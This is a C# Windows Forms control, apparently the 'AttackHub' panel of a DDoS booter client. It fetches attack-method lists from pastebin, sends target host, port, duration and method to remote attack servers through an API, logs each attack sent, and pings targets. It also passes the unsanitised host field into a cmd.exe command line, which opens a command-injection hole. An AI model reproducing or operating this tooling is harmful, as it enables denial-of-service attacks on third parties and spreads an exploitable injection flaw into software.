using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using HomeServices.Helpers;
using Fusion;
using System.Diagnostics;

namespace HomeServices.UserControls
{
    public partial class AttackHub : UserControl
    {
        public AttackHub()
        {
            InitializeComponent();
        }

        private void UpdateAttackLogs()
        {
            var Settings = SettingsManager.Load();
            if (!string.IsNullOrWhiteSpace(Settings.Target))
            {
                TargetBox.Text = Settings.Target;
                PortBox.Text = Settings.Port;
                TimeBox.Text = Settings.Time;
                MethodBox.Text = Settings.Method;
                SendTimeBox.Text = Settings.SentAt;
            }
            else
            {
                TargetBox.Text = "N/a";
                PortBox.Text = "N/a";
                TimeBox.Text = "N/a";
                MethodBox.Text = "N/a";
                SendTimeBox.Text = "N/a";
            }
        }

        private async void AttackHub_Load(object sender, EventArgs e)
        {
            await UpdateMethods("jd9Jepsy");
            UpdateAttackLogs();
            TopMethodLabel.Text = await FusionApp.GetAppVar("TopMethod");
            methodCountLabel.Text = await FusionApp.GetAppVar("MethodCount");
        }

        private async Task UpdateMethods(string appid)
        {
            var methodslist = await Helpers.Client.Http.Get($"https://pastebin.com/raw/{appid}");
            if (!methodslist.Error)
            {
                string[] Methodlines = methodslist.Response.Split(new string[]
                {
                    Environment.NewLine
                }, StringSplitOptions.None);
                method.DataSource = Methodlines;
            }
            else
            {
                method.DataSource = "Error";
            }
           
        }

        private async Task SendAttackAsync(string api_id)
        {
            SendAttackBTN.Enabled = false;
            var apiResponse = await FusionApp.ExecuteFullAPI(api_id, $"&host={host.Text}&port={port.Text}&time={time.Text}&method={method.Text}", Convert.ToInt32(time.Text));
            if (apiResponse.Error == false)
            {
                Alert.Show("Attack Sent", apiResponse.Message);
                SendAttackBTN.Enabled = true;
                Tools.AddNewAttackLog(host.Text, port.Text, time.Text, method.Text);
                UpdateAttackLogs();
            }
            else
            {
                Alert.Show("Attack Faild", apiResponse.Message);
                SendAttackBTN.Enabled = true;
            }
        }

        private async void SendAttackBTN_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(time.Text) || method.Text.Contains("=") || method.Text.Contains("{")) return;

            switch (server.Text)
            {
                case "Server 1":
                    await SendAttackAsync("8117070494304211563");
                    break;

                case "Server 2":
                    await SendAttackAsync("5859734883055609185");
                    break;

                case "Server 3":
                    await SendAttackAsync("2186875634365277647");
                    break;

                default:
                    break;
            }
        }

        private void ClearAttackLogs_Click(object sender, EventArgs e)
        {
            Tools.ClearAllAttackLogs();
            UpdateAttackLogs();
        }

        private void ICMPPingBTN_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(host.Text)) return;
            string PingCMD = $"/K mode con lines=25 cols=60 & ping {host.Text} -t";
            Process.Start("CMD.exe", PingCMD);
        }

        private void TCPBTn_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(host.Text) || string.IsNullOrWhiteSpace(port.Text)) return;
            try
            {
                Process[] proc = Process.GetProcessesByName("paping");
                new Process
                {
                    StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "paping.exe",
                    Arguments = host.Text + " -p " + port.Text
                }
                }.Start();

            }
            catch
            {
                Alert.Show("TCP Ping Error", "Paping.exe was not found");
                return;
            }
        }

        private async void server_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (server.Text)
            {
                case "Server 1":
                    await UpdateMethods("jd9Jepsy");
                    break;

                case "Server 2":
                    await UpdateMethods("EZkH1Fj8");
                    break;

                case "Server 3":
                    await UpdateMethods("mJH9MK3V");
                    break;

                default:
                    break;
            }
        }
    }
}
